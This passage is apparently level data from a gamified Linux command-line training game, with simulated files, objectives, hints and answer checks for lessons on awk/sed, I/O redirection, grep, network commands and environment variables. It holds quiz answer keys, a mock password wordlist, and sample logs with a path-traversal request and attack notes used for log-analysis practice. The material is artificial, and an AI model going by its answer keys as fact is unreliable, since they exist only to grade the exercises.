                    task: 'PARSE: Extract Usernames with AWK',
                    hint: 'Use awk: awk -F: \'{print $1}\' intel/users.db',
                    check: (cmd, state, output) => cmd.includes('awk') && (cmd.includes('print') || cmd.includes('users')) &&
                               output && !output.startsWith('awk:')
                },
                {
                    id: 5,
                    task: 'SANITIZE: Redact IPs with SED',
                    hint: 'sed \'s/10.0.0.88/[REDACTED]/g\' intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sed') && cmd.includes('s/') &&
                               (cmd.includes('REDACTED') || cmd.includes('access')) &&
                               output && !output.startsWith('sed:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on your analysis, which IP is making unauthorized upload attempts?",
                acceptedAnswers: [
                    "10.0.0.88",
                    "10.0.0.88."
                ],
                hint: "Look for repeated 403 (forbidden) responses in the access log.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "IP not confirmed. Analyze the access.log for repeated 403 errors.",
                correctAnswerMessage: "Threat actor identified: 10.0.0.88 - Flagged for monitoring."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-010: I/O Redirection
        // Theme: Data stream control and redirection
        // ──────────────────────────────────────────────────────────
        'CLH-010': {
            title: 'I/O Redirection',
            description: 'Master output redirection, pipes, and data stream control.',
            prerequisites: ['CLH-009'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', '.bash_history', '.redirect_cheatsheet']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'targets.txt', 'notes.txt', 'connections.log', 'errors.log']
                },
                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `192.168.1.105 - Primary target
192.168.1.42 - Secondary target
10.0.0.88 - Unknown actor
172.16.0.23 - Reconnaissance probe`
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `Analyst notes: Monitor 192.168.1.105 for persistence
Priority: HIGH
Last updated: 2024-01-15 10:30 UTC`
                },
                '/home/operator/intel/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 SSH
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 REJECTED`
                },
                '/home/operator/intel/errors.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[ERROR] 10:16:45 Auth failed: 10.0.0.88
[ERROR] 10:18:55 Auth failed: 10.0.0.88
[WARN]  10:20:01 Suspicious scan: 172.16.0.23
[ERROR] 10:22:15 Auth failed: 10.0.0.88
[INFO]  10:25:00 Backup completed successfully`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `Jan 15 10:00:00 shadow systemd[1]: Started Daily apt activities.
Jan 15 10:15:00 shadow kernel: eth0: link up 1000Mbps
Jan 15 10:30:00 shadow cron[1234]: (operator) CMD (backup.sh)
Jan 15 10:45:00 shadow systemd[1]: Starting log rotation...
Jan 15 11:00:00 shadow systemd[1]: Finished log rotation.`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 512,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted key for operator from 192.168.1.105
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['wordlist.txt', 'ips.txt']
                },
                '/home/operator/data/wordlist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: `admin
password
root
user
guest
test
backup`
                },
                '/home/operator/data/ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 80,
                    content: `192.168.1.105
192.168.1.42
10.0.0.88
172.16.0.23
10.0.0.5`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.log', 'README.txt']
                },
                '/home/operator/reports/mission.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `=== MISSION LOG ===
Mission: Stream Control Training
Status: In Progress
Objective: Master I/O redirection
`
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `# Reports Directory

Use this directory to save your analysis output.

Redirect examples:
  command > file.txt    # Write output to file (overwrite)
  command >> file.txt   # Append output to file
  command | tee file    # Output to screen AND file`
                },
                // === HIDDEN FILES ===
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `ls -la
cat intel/access.log
grep 403 intel/access.log
ls intel > reports/inventory.txt
date >> reports/mission.log
cat intel/notes.txt`
                },
                '/home/operator/.redirect_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `=== I/O REDIRECTION CHEATSHEET ===

STDOUT (Standard Output):
  >   Redirect output (overwrite)
  >>  Redirect output (append)
  |   Pipe to another command

STDIN (Standard Input):
  <   Read input from file

STDERR (Standard Error):
  2>  Redirect errors
  2>&1  Redirect errors to stdout

TEE (Split stream):
  cmd | tee file    # Screen AND file
  cmd | tee -a file # Append mode`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'CAPTURE: Redirect Output to File',
                    hint: 'ls intel > reports/filelist.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('>') && !cmd.includes('>>') && cmd.includes('reports') &&
                               output && output.includes('Redirected');
                    }
                },
                {
                    id: 2,
                    task: 'APPEND: Add Timestamp to Log',
                    hint: 'date >> reports/mission.log',
                    check: (cmd, state, output) => cmd.includes('>>') && cmd.includes('mission.log') &&
                               output && output.includes('Redirected')
                },
                {
                    id: 3,
                    task: 'PIPELINE: Filter and Count',
                    hint: 'grep "192.168" intel/access.log | wc -l',
                    check: (cmd, state, output) => cmd.includes('|') && cmd.includes('grep') &&
                               cmd.includes('wc') && output && /^\s*\d+/.test(output)
                },
                {
                    id: 4,
                    task: 'CHAIN: Multi-Stage Pipeline',
                    hint: 'cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => {
                        const pipeCount = (cmd.match(/\|/g) || []).length;
                        return pipeCount >= 2 && cmd.includes('uniq') && output && output.includes('192');
                    }
                },
                {
                    id: 5,
                    task: 'TEE: Split the Stream',
                    hint: 'ls -la intel | tee reports/inventory.txt',
                    check: (cmd, state, output) => cmd.includes('tee') && cmd.includes('reports') &&
                               output && !output.startsWith('tee:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to the analyst notes, which IP should be monitored for persistence?",
                acceptedAnswers: [
                    "192.168.1.105",
                    "192.168.1.105."
                ],
                hint: "Check the intel directory for analyst notes about monitoring targets.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Target IP not confirmed. Review the analyst notes in intel/.",
                correctAnswerMessage: "Target confirmed: 192.168.1.105 - Added to persistence watchlist."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-011: Advanced Grep
        // Theme: Pattern matching and regex mastery
        // ──────────────────────────────────────────────────────────
        'CLH-011': {
            title: 'Advanced Grep',
            description: 'Master grep options and regular expressions for pattern hunting.',
            prerequisites: ['CLH-010'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', 'data', '.bash_history', '.grep_cheatsheet']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'network.log', 'access.log', 'error.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 678,
                    content: `Jan 15 10:15:32 shadow kernel: [INFO] System started
Jan 15 10:15:33 shadow systemd: [INFO] Network service started
Jan 15 10:16:01 shadow kernel: [ERROR] Disk I/O timeout on /dev/sdb
Jan 15 10:16:45 shadow cron: [INFO] Scheduled task executed
Jan 15 10:17:22 shadow kernel: [Warning] High memory usage detected
Jan 15 10:18:03 shadow systemd: [INFO] Service httpd restarted
Jan 15 10:18:55 shadow kernel: [ERROR] Buffer overflow in module xyz
Jan 15 10:19:12 shadow sshd: [INFO] Connection from 192.168.1.105
Jan 15 10:20:01 shadow kernel: [error] Failed to allocate memory
Jan 15 10:21:33 shadow systemd: [INFO] Backup completed
Jan 15 10:22:15 shadow kernel: [ERROR] Watchdog timeout - system unstable`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 612,
                    content: `Jan 15 10:15:32 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:15:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:16:01 shadow sshd[1235]: success login for operator from 192.168.1.42
Jan 15 10:16:22 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:17:03 shadow sshd[1236]: success login for analyst from 192.168.1.105
Jan 15 10:17:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:18:12 shadow sshd[1237]: success login for backup from localhost
Jan 15 10:18:55 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:19:33 shadow sshd[1234]: FAILED login for test from 10.0.0.88
Jan 15 10:20:15 shadow sshd[1238]: success login for monitor from 172.16.0.23`
                },
                '/home/operator/logs/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `10:15:32 TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
10:15:45 TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
10:16:01 UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
10:16:22 TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
10:17:03 TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
10:17:45 ICMP 10.0.0.88 -> 192.168.1.1 ECHO_REQUEST
10:18:12 TCP 192.168.1.105:44823 -> 10.0.0.5:3306 ESTABLISHED
10:18:55 UDP 192.168.1.42:12345 -> 10.0.0.5:161 SNMP
10:19:33 TCP 10.0.0.88:55555 -> 192.168.1.1:445 SYN_SENT
10:20:15 TCP 172.16.0.23:61235 -> 10.0.0.5:443 ESTABLISHED`
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200 1234
10.0.0.88 - - [15/Jan/2024:10:15:45] "POST /admin/login.php" 401 567
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200 8901
10.0.0.88 - - [15/Jan/2024:10:16:22] "POST /admin/login.php" 401 567
192.168.1.105 - - [15/Jan/2024:10:17:03] "GET /api/users" 200 2345
10.0.0.88 - - [15/Jan/2024:10:17:45] "POST /admin/login.php" 401 567
172.16.0.23 - - [15/Jan/2024:10:18:12] "GET /dashboard" 200 4567
10.0.0.88 - - [15/Jan/2024:10:18:55] "GET /robots.txt" 200 123
192.168.1.105 - - [15/Jan/2024:10:19:33] "GET /admin/config.php" 403 234
10.0.0.88 - - [15/Jan/2024:10:20:15] "GET /../../../etc/passwd" 400 0`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 567,
                    content: `[ERROR] 10:15:45 - SQL injection attempt detected from 10.0.0.88
[WARNING] 10:16:22 - Multiple failed auth attempts from 10.0.0.88
[ERROR] 10:17:45 - Brute force pattern detected from 10.0.0.88
[INFO] 10:18:12 - Rate limiting enabled for 10.0.0.88
[ERROR] 10:19:33 - Path traversal attempt blocked from 10.0.0.88
[CRITICAL] 10:20:15 - Attack signature matched: directory traversal`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `Grep Output Directory
Save your search results here using redirection:
grep -i "error" logs/system.log > reports/errors.txt`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['suspicious_ips.txt', 'known_attackers.txt']
                },
                '/home/operator/data/suspicious_ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `10.0.0.88 - Flagged for investigation
10.0.0.99 - Known scanner
172.16.100.5 - Suspicious activity
192.168.50.123 - Under review`
                },
                '/home/operator/data/known_attackers.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Known malicious IPs - DO NOT WHITELIST
10.0.0.88 - Active attacker (brute force, SQL injection, path traversal)
185.220.101.1 - Tor exit node
45.33.32.156 - Botnet C2
198.51.100.23 - DDoS source`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `ls -la logs/
cat logs/auth.log | head
grep "FAILED" logs/auth.log
grep -i error logs/system.log
grep -v success logs/auth.log
grep -c FAILED logs/auth.log
grep -n 192.168 logs/network.log`
                },
                '/home/operator/.grep_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `GREP QUICK REFERENCE
====================
-i  Case insensitive
-v  Invert match (exclude)
-c  Count matches only
-n  Show line numbers
-r  Recursive search
-E  Extended regex (egrep)
-o  Only show matched part
-l  List files with matches
-A3 Show 3 lines after match
-B3 Show 3 lines before match
-C3 Show 3 lines context

REGEX BASICS:
.     Any single character
*     Zero or more of previous
+     One or more (use -E)
^     Start of line
$     End of line
[abc] Character class
[0-9] Digit range`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'HUNT: Case-Insensitive Search',
                    hint: 'Find "error" (any case): grep -i "error" logs/system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-i') &&
                               cmd.toLowerCase().includes('error') &&
                               output && !output.startsWith('grep:') && output.length > 0
                },
                {
                    id: 2,
                    task: 'EXCLUDE: Invert the Match',
                    hint: 'Show non-success lines: grep -v "success" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-v') &&
                               output && !output.startsWith('grep:') && output.includes('FAILED')
                },
                {
                    id: 3,
                    task: 'COUNT: Quantify the Threat',
                    hint: 'Count FAILED logins: grep -c "FAILED" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
                               output && /^\d+$/.test(output.trim()) && parseInt(output.trim()) > 0
                },
                {
                    id: 4,
                    task: 'LOCATE: Show Line Numbers',
                    hint: 'Show with line numbers: grep -n "192.168" logs/network.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
                               output && /^\d+:/.test(output.trim())
                },
                {
                    id: 5,
                    task: 'REGEX: Match IP Pattern',
                    hint: 'Use regex: grep -E "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" logs/network.log',
                    check: (cmd, state, output) => ((cmd.includes('grep') && cmd.includes('-E')) ||
                               cmd.includes('egrep')) && output && !output.startsWith('grep:') &&
                               /\d+\.\d+\.\d+\.\d+/.test(output)
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "How many failed login attempts were recorded in auth.log?",
                acceptedAnswers: [
                    "6",
                    "six",
                    "6 failed",
                    "6 attempts"
                ],
                hint: "Use grep -c to count lines matching 'FAILED' in the auth log.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Count not confirmed. Use grep -c 'FAILED' logs/auth.log",
                correctAnswerMessage: "Brute force confirmed: 6 failed attempts from hostile IP. Countermeasures deployed."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-012: Network Basics
        // Theme: Network reconnaissance commands
        // ──────────────────────────────────────────────────────────
        'CLH-012': {
            title: 'Network Basics',
            description: 'Master ping, netstat, ss, and ip commands for network reconnaissance.',
            prerequisites: ['CLH-011'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'logs', 'reports', '.bash_history', '.network_cheatsheet']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['targets.txt', 'scan_results.txt', 'network_map.txt', 'services.txt']
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `# Target Network - Shadow Operations
10.0.0.5 - Primary server (CRITICAL)
10.0.0.10 - Database server
10.0.0.15 - Web server
10.0.0.20 - File server
192.168.1.1 - Gateway/Router
192.168.1.105 - Analyst workstation
172.16.0.1 - DMZ gateway`
                },
                '/home/operator/intel/scan_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Port scan results for 10.0.0.5:
22/tcp open ssh OpenSSH 8.2
80/tcp open http Apache 2.4.41
443/tcp open https Apache 2.4.41
3306/tcp open mysql MySQL 8.0.23
8080/tcp filtered http-proxy`
                },
                '/home/operator/intel/network_map.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 345,
                    content: `NETWORK TOPOLOGY
================
                    [Internet]
                        |
                  [192.168.1.1]  <-- Gateway
                        |
        +---------------+---------------+
        |               |               |
   [10.0.0.5]      [10.0.0.10]    [10.0.0.15]
   Primary         Database        Web
   Server          Server          Server`
                },
                '/home/operator/intel/services.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `Running Services Detected:
- SSH (22): Remote administration
- HTTP (80): Web application
- HTTPS (443): Secure web
- MySQL (3306): Database backend
- Monitoring agent on 10.0.0.5:9100`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['connections.log', 'ping.log']
                },
                '/home/operator/logs/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 10:15:32 ESTABLISHED 192.168.1.105:44821 -> 10.0.0.5:443
2024-01-15 10:15:45 ESTABLISHED 192.168.1.42:55123 -> 10.0.0.5:80
2024-01-15 10:16:01 TIME_WAIT 10.0.0.88:53421 -> 10.0.0.5:3306
2024-01-15 10:16:22 ESTABLISHED 172.16.0.23:61234 -> 10.0.0.5:22
2024-01-15 10:17:03 SYN_SENT 10.0.0.88:55555 -> 10.0.0.5:445`
                },
                '/home/operator/logs/ping.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Connectivity check - 2024-01-15
10.0.0.5: 64 bytes, time=0.5ms - UP
10.0.0.10: 64 bytes, time=0.8ms - UP
10.0.0.15: 64 bytes, time=1.2ms - UP
192.168.1.1: 64 bytes, time=0.3ms - UP
172.16.0.1: Request timeout - DOWN`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: `Network Recon Reports
Save your findings here:
netstat -tuln > reports/ports.txt`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `cat intel/targets.txt
ping 10.0.0.5
netstat -tuln
ss -tp
ip addr
ip route
cat intel/scan_results.txt`
                },
                '/home/operator/.network_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `NETWORK RECON CHEATSHEET
========================
CONNECTIVITY:
  ping <ip>           Test if host is up
  ping -c 4 <ip>      Send only 4 packets

LISTENING PORTS:
  netstat -tuln       TCP/UDP listening ports
  ss -tuln            Modern alternative to netstat

CONNECTIONS:
  netstat -tp         TCP connections with PIDs
  ss -tp              Socket stats with processes

IP CONFIGURATION:
  ip addr             Show all IP addresses
  ip a                Short form
  ifconfig            Legacy command

ROUTING:
  ip route            Show routing table
  route -n            Legacy routing table`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Check Host Connectivity',
                    hint: 'Test connectivity: ping 10.0.0.5',
                    check: (cmd, state, output) => cmd.includes('ping') &&
                               output && (output.includes('bytes from') || output.includes('PING'))
                },
                {
                    id: 2,
                    task: 'SCAN: List Listening Ports',
                    hint: 'Show listening ports: netstat -tuln',
                    check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) &&
                               output && (output.includes('LISTEN') || output.includes('Local Address'))
                },
                {
                    id: 3,
                    task: 'ANALYZE: Socket Statistics',
                    hint: 'Show connections: ss -tp',
                    check: (cmd, state, output) => cmd.includes('ss') &&
                               output && (output.includes('ESTAB') || output.includes('State'))
                },
                {
                    id: 4,
                    task: 'IDENTIFY: Show IP Configuration',
                    hint: 'Display IPs: ip addr',
                    check: (cmd, state, output) => (cmd.includes('ip') && (cmd.includes('addr') || cmd.includes(' a '))) &&
                               output && (output.includes('inet') || output.includes('192.168'))
                },
                {
                    id: 5,
                    task: 'MAP: View Routing Table',
                    hint: 'Show routes: ip route',
                    check: (cmd, state, output) => cmd.includes('ip') && cmd.includes('route') &&
                               output && (output.includes('default') || output.includes('via'))
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on the scan results, what database port is open on the target?",
                acceptedAnswers: ["3306", "mysql", "3306/tcp"],
                hint: "Check the scan_results.txt file in the intel directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Port not confirmed. Review the scan results in intel/.",
                correctAnswerMessage: "Confirmed: MySQL on port 3306. Database access possible."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-013: Environment Variables
        // Theme: Shell environment manipulation
        // ──────────────────────────────────────────────────────────
        'CLH-013': {
            title: 'Environment Variables',
            description: 'Understand and manipulate shell environment variables.',
            prerequisites: ['CLH-012'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['.bashrc', '.profile', '.bash_history', '.env_cheatsheet', 'scripts', 'config']
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w$ "
alias ll="ls -la"
alias grep="grep --color=auto"
export EDITOR=vim
export HISTSIZE=10000
# Custom tools path
export TOOLS=/opt/shadow-tools`
                },
                '/home/operator/.profile': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `# Profile settings - loaded at login
export PATH=$PATH:$HOME/bin
export LANG=en_US.UTF-8

# Mission-specific settings
export LOG_LEVEL=debug
export OPERATION_MODE=stealth`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `env
echo $PATH
echo $HOME
export MISSION=active
export PATH=$PATH:/opt/shadow-tools
cat .bashrc
printenv | grep PATH`
                },
                '/home/operator/.env_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `ENVIRONMENT VARIABLES CHEATSHEET
=================================
VIEWING:
  env                  Show all variables
  printenv             Same as env
  echo $VAR            Show specific variable
  printenv VAR         Show specific (no $)

SETTING:
  VAR=value            Set for current command only
  export VAR=value     Set for current session
  unset VAR            Remove variable

IMPORTANT VARIABLES:
  PATH     Search path for commands
  HOME     User's home directory
  USER     Current username
  SHELL    Current shell
  PWD      Current directory
  EDITOR   Default text editor
  LANG     Language/locale

PERSISTENCE:
  ~/.bashrc   Loaded on each new shell
  ~/.profile  Loaded at login only`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['setup_env.sh']
                },
                '/home/operator/scripts/setup_env.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `#!/bin/bash
# Setup mission environment
export MISSION=active
export TARGET_IP=10.0.0.5
export LOG_DIR=/var/log/ops
export PATH=$PATH:/opt/shadow-tools

echo "Environment configured for operation"
env | grep -E "(MISSION|TARGET|LOG_DIR)"`
                },
                '/home/operator/config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.env']
                },
                '/home/operator/config/mission.env': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `# Mission configuration - source this file
# Usage: source config/mission.env

export OPERATION_NAME="Shadow Strike"
export TARGET_NETWORK="10.0.0.0/24"
export EXFIL_SERVER="192.168.100.1"
export ENCRYPTION_KEY="[CLASSIFIED]"`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List All Variables',
                    hint: 'Display all: env',
                    check: (cmd, state, output) => (cmd.includes('env') || cmd.includes('printenv')) &&
                               output && (output.includes('PATH') || output.includes('HOME'))
                },
                {
                    id: 2,
                    task: 'INSPECT: Check Your PATH',
                    hint: 'Show PATH: echo $PATH',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('PATH') &&
                               output && (output.includes('/usr') || output.includes('/bin'))
                },
                {
                    id: 3,
                    task: 'IDENTIFY: Find Your Home',
                    hint: 'Show HOME: echo $HOME',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('HOME') &&
                               output && output.includes('/home')
                },
                {
                    id: 4,
                    task: 'CREATE: Set Mission Variable',
                    hint: 'Create variable: export MISSION=active',
